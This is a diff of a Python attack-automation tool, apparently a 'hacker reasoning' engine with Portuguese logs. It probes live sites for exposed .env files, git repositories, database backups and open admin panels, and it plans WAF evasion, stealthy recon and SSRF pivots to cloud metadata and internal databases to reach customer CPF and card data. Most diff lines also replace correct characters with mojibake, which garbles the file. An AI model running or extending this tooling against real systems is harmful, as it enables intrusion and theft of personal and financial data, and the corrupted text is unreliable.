+         "escalation": "Mutations admin â†’ alterar roles, deletar dados, exfiltrar em batch"},
     ],
-    "GraphQL é um único endpoint — WAF tem dificuldade em filtrar payloads complexos no body",
+    "GraphQL Ã© um Ãºnico endpoint  WAF tem dificuldade em filtrar payloads complexos no body",
     ["schema_types", "user_data", "admin_mutations", "internal_fields"],
     ["/api/users", "/admin", "/api/orders"],
     ["graphql_introspection_enabled", "sensitive_queries_accessible"]
@@ -1315,7 +1315,7 @@ class IncidentAbsorber:
 
         data_id = f"{data_type.upper()} via {service}"
         if data_type in ("pii_data", "financial_data"):
-            data_id = f"PII CONFIRMED — {service}"
+            data_id = f"PII CONFIRMED  {service}"
 
         ev = IncidentEvidence(
             attack_vector="SSRF",
@@ -1412,19 +1412,19 @@ class HackerReasoningEngine:
 
     async def execute(self) -> Dict:
         self.log(
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
             "error", "hacker_reasoning"
         )
         self.log(
-            "█ HACKER REASONING DICTIONARY v2.0 — GEOPOLITICAL KILL CHAIN ENGINE █",
+            "â–ˆ HACKER REASONING DICTIONARY v2.0  GEOPOLITICAL KILL CHAIN ENGINE â–ˆ",
             "error", "hacker_reasoning"
         )
         self.log(
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
             "error", "hacker_reasoning"
         )
         self.log(
-            f"[HRD] Loading {len(HACKER_REASONING_DICTIONARY)} playbooks — "
+            f"[HRD] Loading {len(HACKER_REASONING_DICTIONARY)} playbooks  "
             f"analyzing {len(self.findings)} findings + {len(self.exposed_assets)} assets...",
             "warn", "hacker_reasoning"
         )
@@ -1451,7 +1451,7 @@ class HackerReasoningEngine:
 
     def _detect_environment(self):
         self.log(
-            "[HRD §1] ENVIRONMENT ANALYSIS — WAF detection + infrastructure fingerprinting...",
+            "[HRD Â§1] ENVIRONMENT ANALYSIS  WAF detection + infrastructure fingerprinting...",
             "warn", "hacker_reasoning"
         )
 
@@ -1492,14 +1492,14 @@ class HackerReasoningEngine:
 
         if self.waf_detected:
             self.log(
-                f"[HRD] ⚡ PROBABILIDADE DE BLOQUEIO: {self.waf_vendor} detectado — "
+                f"[HRD] âš¡ PROBABILIDADE DE BLOQUEIO: {self.waf_vendor} detectado  "
                 f"priorizando vetores silenciosos (SSRF, API abuse) sobre brute force direto",
                 "warn", "hacker_reasoning"
             )
 
     def _match_playbooks(self):
         self.log(
-            "[HRD §2] PLAYBOOK MATCHING — Mapping findings/assets to attack reasoning chains...",
+            "[HRD Â§2] PLAYBOOK MATCHING  Mapping findings/assets to attack reasoning chains...",
             "warn", "hacker_reasoning"
         )
 
@@ -1550,7 +1550,7 @@ class HackerReasoningEngine:
                         })
 
         self.log(
-            f"[HRD] ✓ Matched {len(self.matched_playbooks)} playbooks from "
+            f"[HRD] âœ“ Matched {len(self.matched_playbooks)} playbooks from "
             f"{len(HACKER_REASONING_DICTIONARY)} dictionary entries",
             "error" if len(self.matched_playbooks) > 0 else "info",
             "hacker_reasoning"
@@ -1559,8 +1559,8 @@ class HackerReasoningEngine:
         for mp in self.matched_playbooks:
             pb = mp["playbook"]
             self.log(
-                f"[HRD] ▸ {pb.route_pattern} [{pb.category.upper()}] "
-                f"[{pb.threat_level.value.upper()}] — {pb.attacker_perspective[:80]}...",
+                f"[HRD] â–¸ {pb.route_pattern} [{pb.category.upper()}] "
+                f"[{pb.threat_level.value.upper()}]  {pb.attacker_perspective[:80]}...",
                 "error" if pb.threat_level in (ThreatLevel.CRITICAL, ThreatLevel.HIGH) else "warn",
                 "hacker_reasoning"
             )
@@ -1601,40 +1601,40 @@ class HackerReasoningEngine:
 
         if not subdomain_targets:
             self.log(
-                "[HRD §2.5] SUBDOMAIN PRIORITY RECON — No sensitive subdomains detected — skipping",
+                "[HRD Â§2.5] SUBDOMAIN PRIORITY RECON  No sensitive subdomains detected  skipping",
                 "info", "hacker_reasoning"
             )
             return
 
         self.log(
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
             "error", "hacker_reasoning"
         )
         self.log(
-            "█ HACKER REASONING v2.0 — SILENT STEALTH MODE ACTIVATED █",
+            "â–ˆ HACKER REASONING v2.0  SILENT STEALTH MODE ACTIVATED â–ˆ",
             "error", "hacker_reasoning"
         )
         self.log(
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
             "error", "hacker_reasoning"
         )
 
         stealth_subs = [s for s in subdomain_targets if any(p in s for p in ("dev", "admin", "staging", "painel"))]
         if stealth_subs:
             self.log(
-                f"[HRD v2.0] GEOPOLITICAL DECISION: dev/admin subdomains detected ({', '.join(stealth_subs[:4])}) — "
+                f"[HRD v2.0] GEOPOLITICAL DECISION: dev/admin subdomains detected ({', '.join(stealth_subs[:4])})  "
                 f"engaging SILENT STEALTH MODE: low-noise recon first, noisy injections deferred",
                 "error", "hacker_reasoning"
             )
             self.log(
                 "[HRD v2.0] STEALTH PRIORITY: Auth Bypass + Source Map (.map) + .env exposure "
-                "BEFORE any SQLi/XSS/SSRF noise — minimize WAF trigger probability",
+                "BEFORE any SQLi/XSS/SSRF noise  minimize WAF trigger probability",
                 "error", "hacker_reasoning"
             )
 
         self.log(
-            f"[HRD §2.5] Subdomínios sensíveis: {', '.join(subdomain_targets[:6])} — "
-            f"priorizando Auth Bypass + Source Map (.map) ANTES de injeções ruidosas",
+            f"[HRD Â§2.5] SubdomÃ­nios sensÃ­veis: {', '.join(subdomain_targets[:6])}  "
+            f"priorizando Auth Bypass + Source Map (.map) ANTES de injeÃ§Ãµes ruidosas",
             "error", "hacker_reasoning"
         )
         self.emit("hrd_phase", {
@@ -1671,12 +1671,12 @@ class HackerReasoningEngine:
                 sub_result["response_length"] = len(resp.text)
 
                 self.log(
-                    f"[SUBDOMAIN] ⚡ {sub_host} ACESSÍVEL — HTTP {resp.status_code} ({len(resp.text)} bytes)",
+                    f"[SUBDOMAIN] âš¡ {sub_host} ACESSÃVEL  HTTP {resp.status_code} ({len(resp.text)} bytes)",
                     "error", "hacker_reasoning"
                 )
 
                 self.log(
-                    f"[SUBDOMAIN] §1 AUTH BYPASS PRIORITY — testando {len(auth_bypass_paths)} caminhos admin em {sub_host}...",
+                    f"[SUBDOMAIN] Â§1 AUTH BYPASS PRIORITY  testando {len(auth_bypass_paths)} caminhos admin em {sub_host}...",
                     "warn", "hacker_reasoning"
                 )
 
@@ -1700,20 +1700,20 @@ class HackerReasoningEngine:
                             bypass_result["bypassed"] = True
                             bypass_result["evidence"] = r.text[:300]
                             self.log(
-                                f"[SUBDOMAIN] ▸ AUTH BYPASS: {sub_host}{path} → HTTP 200 + admin content detected!",
+                                f"[SUBDOMAIN] â–¸ AUTH BYPASS: {sub_host}{path} â†’ HTTP 200 + admin content detected!",
                                 "error", "hacker_reasoning"
                             )
                             self._emit_hrd_finding(
                                 f"Auth Bypass via Subdomain: {sub_host}{path}",
                                 f"Subdomain {sub_host} exposes admin panel at {path} without authentication. "
                                 f"Status: HTTP {r.status_code}, admin-related content confirmed in response body. "
-                                f"Subdomínio sensível com painel administrativo acessível — broken access control.",
+                                f"SubdomÃ­nio sensÃ­vel com painel administrativo acessÃ­vel  broken access control.",
                                 "critical", f"{sub_host}{path}"
                             )
                             sub_result["priority_finding"] = "auth_bypass_confirmed"
                         elif is_accessible:
                             self.log(
-                                f"[SUBDOMAIN]   {sub_host}{path} → HTTP {r.status_code} (redirect/accessible)",
+                                f"[SUBDOMAIN]   {sub_host}{path} â†’ HTTP {r.status_code} (redirect/accessible)",
                                 "warn", "hacker_reasoning"
                             )
 
@@ -1733,7 +1733,7 @@ class HackerReasoningEngine:
                         continue
 
                 self.log(
-                    f"[SUBDOMAIN] §2 SOURCE MAP RECON — buscando .map files em {sub_host}...",
+                    f"[SUBDOMAIN] Â§2 SOURCE MAP RECON  buscando .map files em {sub_host}...",
                     "warn", "hacker_reasoning"
                 )
 
@@ -1752,14 +1752,14 @@ class HackerReasoningEngine:
                             map_result["found"] = True
                             map_result["size_bytes"] = len(r.text)
                             self.log(
-                                f"[SUBDOMAIN] ▸ SOURCE MAP EXPOSED: {sub_host}{map_path} ({len(r.text)} bytes) — código fonte recuperável!",
+                                f"[SUBDOMAIN] â–¸ SOURCE MAP EXPOSED: {sub_host}{map_path} ({len(r.text)} bytes)  cÃ³digo fonte recuperÃ¡vel!",
                                 "error", "hacker_reasoning"
                             )
                             self._emit_hrd_finding(
                                 f"Source Map Exposed on Subdomain: {sub_host}{map_path}",
                                 f"Source map file found at {sub_host}{map_path} ({len(r.text)} bytes). "
                                 f"Original source code can be reconstructed, exposing internal routes, API keys, and auth logic. "
-                                f"Subdomínios dev/staging frequentemente expõem source maps sem proteção.",
+                                f"SubdomÃ­nios dev/staging frequentemente expÃµem source maps sem proteÃ§Ã£o.",
                                 "high", f"{sub_host}{map_path}"
                             )
                             if not sub_result["priority_finding"]:
@@ -1772,7 +1772,7 @@ class HackerReasoningEngine:
 
             except Exception:
                 self.log(
-                    f"[SUBDOMAIN] {sub_host} — não acessível (DNS/timeout/blocked)",
+                    f"[SUBDOMAIN] {sub_host}  nÃ£o acessÃ­vel (DNS/timeout/blocked)",
                     "info", "hacker_reasoning"
                 )
 
@@ -1786,7 +1786,7 @@ class HackerReasoningEngine:
         )
 
         self.log(
-            f"[SUBDOMAIN] RESULTADO: {accessible}/{len(self.subdomain_recon_results)} acessíveis | "
+            f"[SUBDOMAIN] RESULTADO: {accessible}/{len(self.subdomain_recon_results)} acessÃ­veis | "
             f"{bypasses} auth bypasses | {maps_found} source maps expostos",
             "error" if bypasses > 0 or maps_found > 0 else "warn",
             "hacker_reasoning"
@@ -1795,14 +1795,14 @@ class HackerReasoningEngine:
         if bypasses > 0 or maps_found > 0:
             self.subdomain_priority_active = True
             self.log(
-                f"[SUBDOMAIN] DECISÃO: Subdomínios confirmados vulneráveis — "
-                f"injeções ruidosas (SQLi/XSS) ADIADAS. Priorizando exfiltração silenciosa.",
+                f"[SUBDOMAIN] DECISÃƒO: SubdomÃ­nios confirmados vulnerÃ¡veis  "
+                f"injeÃ§Ãµes ruidosas (SQLi/XSS) ADIADAS. Priorizando exfiltraÃ§Ã£o silenciosa.",
                 "error", "hacker_reasoning"
             )
 
     async def _execute_reasoning_chains(self):
         self.log(
-            "[HRD §3] KILL CHAIN EXECUTION — Running attacker reasoning for each matched playbook...",
+            "[HRD Â§3] KILL CHAIN EXECUTION  Running attacker reasoning for each matched playbook...",
             "error", "hacker_reasoning"
         )
         self.emit("hrd_phase", {"phase": "reasoning_chains", "matched": len(self.matched_playbooks)})
@@ -1814,7 +1814,7 @@ class HackerReasoningEngine:
                 key=lambda mp: 0 if mp["playbook"].category not in noisy_categories else 1
             )
             self.log(
-                "[HRD] SUBDOMAIN PRIORITY ACTIVE — reordering kill chains: silent exfiltration first, noisy injections deferred",
+                "[HRD] SUBDOMAIN PRIORITY ACTIVE  reordering kill chains: silent exfiltration first, noisy injections deferred",
                 "warn", "hacker_reasoning"
             )
         else:
@@ -1825,7 +1825,7 @@ class HackerReasoningEngine:
 
             if self.subdomain_priority_active and pb.category in noisy_categories:
                 self.log(
-                    f"[HRD] ⏸ DEFERRED (subdomain priority): {pb.route_pattern} [{pb.category.upper()}] — noisy injection skipped",
+                    f"[HRD] â¸ DEFERRED (subdomain priority): {pb.route_pattern} [{pb.category.upper()}]  noisy injection skipped",
                     "warn", "hacker_reasoning"
                 )
                 self.reasoning_chains.append({
@@ -1833,7 +1833,7 @@ class HackerReasoningEngine:
                     "category": pb.category,
                     "threat_level": pb.threat_level.value,
                     "perspective": pb.attacker_perspective,
-                    "waf_evasion": "DEFERRED — subdomain priority active",
+                    "waf_evasion": "DEFERRED  subdomain priority active",
                     "steps": [{"step": 0, "phase": "deferred", "thought": "Noisy injection deferred due to subdomain priority recon", "action": "Skipped", "confirmation": "N/A", "fallback": None, "escalation": None}],
                     "data_targets": pb.data_targets,
                     "pivot_routes": pb.pivot_routes,
@@ -1845,14 +1845,14 @@ class HackerReasoningEngine:
                 "category": pb.category,
                 "threat_level": pb.threat_level.value,
                 "perspective": pb.attacker_perspective,
-                "waf_evasion": pb.waf_evasion if self.waf_detected else "No WAF detected — direct approach",
+                "waf_evasion": pb.waf_evasion if self.waf_detected else "No WAF detected  direct approach",
                 "steps": [],
                 "data_targets": pb.data_targets,
                 "pivot_routes": pb.pivot_routes,
             }
 
             self.log(
-                f"[HRD] ━━━ KILL CHAIN: {pb.route_pattern} ━━━",
+                f"[HRD] â”â”â” KILL CHAIN: {pb.route_pattern} â”â”â”",
                 "error", "hacker_reasoning"
             )
             self.log(
@@ -1875,23 +1875,23 @@ class HackerReasoningEngine:
                     "warn", "hacker_reasoning"
                 )
                 self.log(
-                    f"[HRD]   → ACTION: {step.action[:100]}",
+                    f"[HRD]   â†’ ACTION: {step.action[:100]}",
                     "info", "hacker_reasoning"
                 )
                 self.log(
-                    f"[HRD]   → CONFIRM: {step.confirmation[:100]}",
+                    f"[HRD]   â†’ CONFIRM: {step.confirmation[:100]}",
                     "info", "hacker_reasoning"
                 )
 
                 if self.waf_detected and step.fallback:
                     self.log(
-                        f"[HRD]   → FALLBACK (WAF): {step.fallback[:100]}",
+                        f"[HRD]   â†’ FALLBACK (WAF): {step.fallback[:100]}",
                         "warn", "hacker_reasoning"
                     )
 
                 if step.escalation:
                     self.log(
-                        f"[HRD]   → ESCALATION: {step.escalation[:100]}",
+                        f"[HRD]   â†’ ESCALATION: {step.escalation[:100]}",
                         "error", "hacker_reasoning"
                     )
                     self.escalation_paths.append({
@@ -1925,7 +1925,7 @@ class HackerReasoningEngine:
 
     async def _execute_confirmation_probes(self):
         self.log(
-            "[HRD §4] CONFIRMATION PROBES — Testing key indicators against live target...",
+            "[HRD Â§4] CONFIRMATION PROBES  Testing key indicators against live target...",
             "warn", "hacker_reasoning"
         )
         self.emit("hrd_phase", {"phase": "confirmation_probes"})
@@ -1953,7 +1953,7 @@ class HackerReasoningEngine:
 
                 if indicator in ("admin_dashboard_visible", "price_persisted_in_db",
                                  "server_accepted_client_price", "order_id_with_zero_value"):
-                    probe_result["evidence"] = f"Requires active exploitation — logged as theoretical chain"
+                    probe_result["evidence"] = f"Requires active exploitation  logged as theoretical chain"
 
                 elif indicator in ("env_file_captured", "env_file_exposed"):
                     try:
@@ -1965,15 +1965,15 @@ class HackerReasoningEngine:
                         if resp.status_code == 200 and any(k in resp.text.lower() for k in
                             ["database", "secret", "password", "key=", "token"]):
                             probe_result["confirmed"] = True
-                            probe_result["evidence"] = f".env accessible — {len(resp.text)} bytes, contains credential patterns"
+                            probe_result["evidence"] = f".env accessible  {len(resp.text)} bytes, contains credential patterns"
                             self.confirmed_chains += 1
                             self._emit_hrd_finding(
-                                "CRITICAL: .env File Exposed — Full Credential Dump",
+                                "CRITICAL: .env File Exposed  Full Credential Dump",
                                 "Hacker Reasoning Dictionary confirmed .env file is accessible and contains credential patterns",
                                 "critical", "/.env"
                             )
                         else:
-                            probe_result["evidence"] = f"Status {resp.status_code} — not directly exploitable"
+                            probe_result["evidence"] = f"Status {resp.status_code}  not directly exploitable"
                     except Exception:
                         probe_result["evidence"] = "Connection timeout or error"
 
@@ -1986,10 +1986,10 @@ class HackerReasoningEngine:
                         )
                         if resp.status_code == 200 and "ref:" in resp.text.lower():
                             probe_result["confirmed"] = True
-                            probe_result["evidence"] = f".git/HEAD accessible — repository exposed"
+                            probe_result["evidence"] = f".git/HEAD accessible  repository exposed"
                             self.confirmed_chains += 1
                             self._emit_hrd_finding(
-                                "HIGH: Git Repository Exposed — Source Code + Historical Secrets",
+                                "HIGH: Git Repository Exposed  Source Code + Historical Secrets",
                                 "Hacker Reasoning confirmed .git/HEAD is accessible. Repository can be reconstructed to extract historical secrets.",
                                 "high", "/.git/HEAD"
                             )
@@ -2023,10 +2023,10 @@ class HackerReasoningEngine:
                         )
                         if resp.status_code == 200 and "__schema" in resp.text:
                             probe_result["confirmed"] = True
-                            probe_result["evidence"] = "GraphQL introspection enabled — full schema accessible"
+                            probe_result["evidence"] = "GraphQL introspection enabled  full schema accessible"
                             self.confirmed_chains += 1
                             self._emit_hrd_finding(
-                                "HIGH: GraphQL Introspection Enabled — Full Schema Exposed",
+                                "HIGH: GraphQL Introspection Enabled  Full Schema Exposed",
                                 "Hacker Reasoning confirmed GraphQL introspection returns full schema including internal types and mutations.",
                                 "high", "/graphql"
                             )
@@ -2043,7 +2043,7 @@ class HackerReasoningEngine:
                             )
                             if resp.status_code == 200 and ("sourcesContent" in resp.text or "mappings" in resp.text):
                                 probe_result["confirmed"] = True
-                                probe_result["evidence"] = f"Source map at {map_path} — original code recoverable"
+                                probe_result["evidence"] = f"Source map at {map_path}  original code recoverable"
                                 self.confirmed_chains += 1
                                 break
                         except Exception:
@@ -2063,7 +2063,7 @@ class HackerReasoningEngine:
                                 probe_result["evidence"] = f"Backup file {bkp} accessible ({content_len} bytes)"
                                 self.confirmed_chains += 1
                                 self._emit_hrd_finding(
-                                    f"CRITICAL: Database Backup File Exposed — {bkp}",
+                                    f"CRITICAL: Database Backup File Exposed  {bkp}",
                                     f"Hacker Reasoning confirmed database backup at {bkp} is downloadable ({content_len} bytes). Contains full DB structure and data.",
                                     "critical", bkp
                                 )
@@ -2072,13 +2072,13 @@ class HackerReasoningEngine:
                             continue
 
                 else:
-                    probe_result["evidence"] = "Theoretical — requires full exploitation chain to confirm"
+                    probe_result["evidence"] = "Theoretical  requires full exploitation chain to confirm"
 
                 self.confirmation_results.append(probe_result)
 
-                status = "CONFIRMED ✓" if probe_result["confirmed"] else "THEORETICAL"
+                status = "CONFIRMED âœ“" if probe_result["confirmed"] else "THEORETICAL"
                 self.log(
-                    f"[HRD] Probe [{indicator}]: {status} — {probe_result['evidence'][:80]}",
+                    f"[HRD] Probe [{indicator}]: {status}  {probe_result['evidence'][:80]}",
                     "error" if probe_result["confirmed"] else "info",
                     "hacker_reasoning"
                 )
@@ -2105,7 +2105,7 @@ class HackerReasoningEngine:
         unconfirmed = sum(1 for c in self.confirmation_results if not c["confirmed"])
 
         self.log(
-            f"[HRD §4.1] WAF DEFENSIBILITY ASSESSMENT — {blocked_probes}/{total_probes} probes blocked, "
+            f"[HRD Â§4.1] WAF DEFENSIBILITY ASSESSMENT  {blocked_probes}/{total_probes} probes blocked, "
             f"{unconfirmed}/{total_probes} unconfirmed",
             "warn", "hacker_reasoning"
         )
@@ -2131,30 +2131,30 @@ class HackerReasoningEngine:
             self.chain_intel_ssrf_redirect = True
 
             self.log(
-                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
                 "error", "hacker_reasoning"
             )
             self.log(
-                "█ HRD v2.0 DATA DRIFT: WAF 403 → SSRF INFRASTRUCTURE PIVOT █",
+                "â–ˆ HRD v2.0 DATA DRIFT: WAF 403 â†’ SSRF INFRASTRUCTURE PIVOT â–ˆ",
                 "error", "hacker_reasoning"
             )
             self.log(
-                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
                 "error", "hacker_reasoning"
             )
             self.log(
-                f"[DATA DRIFT] {blocked_probes}/{total_probes} probes clássicos bloqueados pelo WAF "
-                f"({self.waf_vendor if self.waf_detected else 'unknown'}) — "
+                f"[DATA DRIFT] {blocked_probes}/{total_probes} probes clÃ¡ssicos bloqueados pelo WAF "
+                f"({self.waf_vendor if self.waf_detected else 'unknown'})  "
                 f"registrando 'Data Drift: High Defensibility'",
                 "error", "hacker_reasoning"
             )
             self.log(
-                f"[HRD v2.0] GEOPOLITICAL DECISION: WAF ({self.waf_vendor}) blocked {blocked_probes}/{total_probes} classic probes (403) — "
+                f"[HRD v2.0] GEOPOLITICAL DECISION: WAF ({self.waf_vendor}) blocked {blocked_probes}/{total_probes} classic probes (403)  "
                 f"INSTANTANEOUS PIVOT to SSRF Infrastructure: targeting Redis, AWS Metadata, internal DB endpoints",
                 "error", "hacker_reasoning"
             )
             self.log(
-                "[HRD v2.0] KILL CHAIN RE-PRIORITIZED: SSRF → Redis/Memcached → AWS IMDSv2 → Credential Dump → DB Access → Data Exfiltration",
+                "[HRD v2.0] KILL CHAIN RE-PRIORITIZED: SSRF â†’ Redis/Memcached â†’ AWS IMDSv2 â†’ Credential Dump â†’ DB Access â†’ Data Exfiltration",
                 "error", "hacker_reasoning"
             )
 
@@ -2162,11 +2162,11 @@ class HackerReasoningEngine:
             self.waf_defensibility["chain_intel_redirect"] = True
 
             self._emit_hrd_finding(
-                "Data Drift: High Defensibility — WAF Blocked All Classic Probes",
+                "Data Drift: High Defensibility  WAF Blocked All Classic Probes",
                 f"WAF ({self.waf_vendor}) blocked {blocked_probes}/{total_probes} classic attack probes. "
                 f"System registered 'Data Drift: High Defensibility' and automatically redirected "
                 f"attack strategy to Chain Intel: SSRF Exploration phase. "
-                f"Direct attack vectors are ineffective — pivoting to internal infrastructure abuse.",
+                f"Direct attack vectors are ineffective  pivoting to internal infrastructure abuse.",
                 "high", self.base_url
             )
 
@@ -2184,13 +2184,13 @@ class HackerReasoningEngine:
             self.escalation_paths.append({
                 "from_playbook": "waf_defensibility_assessment",
                 "step": 0,
-                "escalation": "Data Drift: High Defensibility → Auto-redirect to Chain Intel SSRF Exploration",
+                "escalation": "Data Drift: High Defensibility â†’ Auto-redirect to Chain Intel SSRF Exploration",
                 "phase": "lateral_movement",
             })
 
         else:
             self.log(
-                f"[HRD §4.1] WAF Defensibility: MODERATE — {total_probes - unconfirmed} probes succeeded, "
+                f"[HRD Â§4.1] WAF Defensibility: MODERATE  {total_probes - unconfirmed} probes succeeded, "
                 f"standard kill chain continues",
                 "info" if unconfirmed < total_probes * 0.5 else "warn",
                 "hacker_reasoning"
@@ -2229,33 +2229,33 @@ class HackerReasoningEngine:
 
         if not ssrf_successes and not self.chain_intel_ssrf_redirect:
             self.log(
-                "[HRD §4.2] DB REFLECTION — No SSRF successes to validate — skipping",
+                "[HRD Â§4.2] DB REFLECTION  No SSRF successes to validate  skipping",
                 "info", "hacker_reasoning"
             )
             return
 
         self.log(
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
             "error", "hacker_reasoning"
         )
         self.log(
-            "█ DB REFLECTION VALIDATION — PROVING DATA REACHABILITY █",
+            "â–ˆ DB REFLECTION VALIDATION  PROVING DATA REACHABILITY â–ˆ",
             "error", "hacker_reasoning"
         )
         self.log(
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
             "error", "hacker_reasoning"
         )
 
         if self.chain_intel_ssrf_redirect:
             self.log(
-                "[DB REFLECTION] Data Drift ativou redirect → executando SSRF exploration antes da reflexão...",
+                "[DB REFLECTION] Data Drift ativou redirect â†’ executando SSRF exploration antes da reflexÃ£o...",
                 "error", "hacker_reasoning"
             )
 
         self.log(
-            f"[HRD §4.2] Validando {len(ssrf_successes)} vetores SSRF confirmados — "
-            f"executando DB Reflection para provar alcance a dados sensíveis (CPF/Cartão)...",
+            f"[HRD Â§4.2] Validando {len(ssrf_successes)} vetores SSRF confirmados  "
+            f"executando DB Reflection para provar alcance a dados sensÃ­veis (CPF/CartÃ£o)...",
             "error", "hacker_reasoning"
         )
         self.emit("hrd_phase", {
@@ -2324,7 +2324,7 @@ class HackerReasoningEngine:
                 ssrf_endpoints = {"/api/proxy", "/api/fetch"}
             else:
                 self.log(
-                    "[DB REFLECTION] No confirmed SSRF endpoints found — skipping reflection (requires validated SSRF pivot)",
+                    "[DB REFLECTION] No confirmed SSRF endpoints found  skipping reflection (requires validated SSRF pivot)",
                     "warn", "hacker_reasoning"
                 )
                 return
@@ -2357,24 +2357,24 @@ class HackerReasoningEngine:
 
                         if hit:
                             self.log(
-                                f"[DB REFLECTION] ⚡ DATA CONFIRMED: {target['name']} via {endpoint}?{param}= — "
-                                f"dados de clientes (CPF/Cartão) AO ALCANCE!",
+                                f"[DB REFLECTION] âš¡ DATA CONFIRMED: {target['name']} via {endpoint}?{param}=  "
+                                f"dados de clientes (CPF/CartÃ£o) AO ALCANCE!",
                                 "error", "hacker_reasoning"
                             )
                             self.log(
-                                f"[DB REFLECTION]   → Data type: {target['data_type']} | "
+                                f"[DB REFLECTION]   â†’ Data type: {target['data_type']} | "
                                 f"Evidence: {body[:200]}",
                                 "error", "hacker_reasoning"
                             )
 
                             severity = "critical" if target["data_type"] in ("pii_data", "financial_data") else "high"
                             self._emit_hrd_finding(
-                                f"DB Reflection: {target['name']} — Customer Data Reachable",
+                                f"DB Reflection: {target['name']}  Customer Data Reachable",
                                 f"DB Reflection confirmed data access to '{target['name']}' via "
                                 f"SSRF at {endpoint}?{param}={target['ssrf_url']}. "
                                 f"Data type: {target['data_type']}. "
-                                f"Dados sensíveis de clientes (CPF, Cartão, sessões) confirmados ao alcance "
-                                f"via cadeia SSRF → serviço interno → banco de dados.",
+                                f"Dados sensÃ­veis de clientes (CPF, CartÃ£o, sessÃµes) confirmados ao alcance "
+                                f"via cadeia SSRF â†’ serviÃ§o interno â†’ banco de dados.",
                                 severity, endpoint
                             )
 
@@ -2408,7 +2408,7 @@ class HackerReasoningEngine:
                            if r["data_reflected"] and r["data_type"] in ("pii_data", "financial_data"))
 
         self.log(
-            f"[DB REFLECTION] RESULTADO: {confirmed_reflections}/{len(self.db_reflection_results)} reflexões confirmadas | "
+            f"[DB REFLECTION] RESULTADO: {confirmed_reflections}/{len(self.db_reflection_results)} reflexÃµes confirmadas | "
             f"{pii_confirmed} com dados PII/financeiros",
             "error" if confirmed_reflections > 0 else "warn",
             "hacker_reasoning"
@@ -2416,14 +2416,14 @@ class HackerReasoningEngine:
 
         if pii_confirmed > 0:
             self.log(
-                f"[THREAT] {pii_confirmed} serviços internos confirmam acesso a dados de clientes (CPF/Cartão) "
-                f"via cadeia SSRF — comprometimento de dados pessoais PROVADO",
+                f"[THREAT] {pii_confirmed} serviÃ§os internos confirmam acesso a dados de clientes (CPF/CartÃ£o) "
+                f"via cadeia SSRF  comprometimento de dados pessoais PROVADO",
                 "error", "hacker_reasoning"
             )
         elif self.chain_intel_ssrf_redirect:
             self.log(
-                "[DB REFLECTION] SSRF exploration executada (Data Drift redirect) — "
-                "endpoints internos não expostos ou bloqueados. Defensibilidade confirmada.",
+                "[DB REFLECTION] SSRF exploration executada (Data Drift redirect)  "
+                "endpoints internos nÃ£o expostos ou bloqueados. Defensibilidade confirmada.",
                 "warn", "hacker_reasoning"
             )
 
@@ -2432,25 +2432,25 @@ class HackerReasoningEngine:
 
         if not failed_probes and not self.matched_playbooks:
             self.log(
-                "[HRD §4.5] RECURSIVE FALLBACK — No failed probes to retry — skipping",
+                "[HRD Â§4.5] RECURSIVE FALLBACK  No failed probes to retry  skipping",
                 "info", "hacker_reasoning"
             )
             return
 
         self.log(
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
             "error", "hacker_reasoning"
         )
         self.log(
-            "█ RECURSIVE FALLBACK ENGINE v1.0 — ADAPTIVE MUTATION █",
+            "â–ˆ RECURSIVE FALLBACK ENGINE v1.0  ADAPTIVE MUTATION â–ˆ",
             "error", "hacker_reasoning"
         )
         self.log(
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
             "error", "hacker_reasoning"
         )
         self.log(
-            "[FALLBACK] Dicionário falhou. Ativando Fallback de IA: "
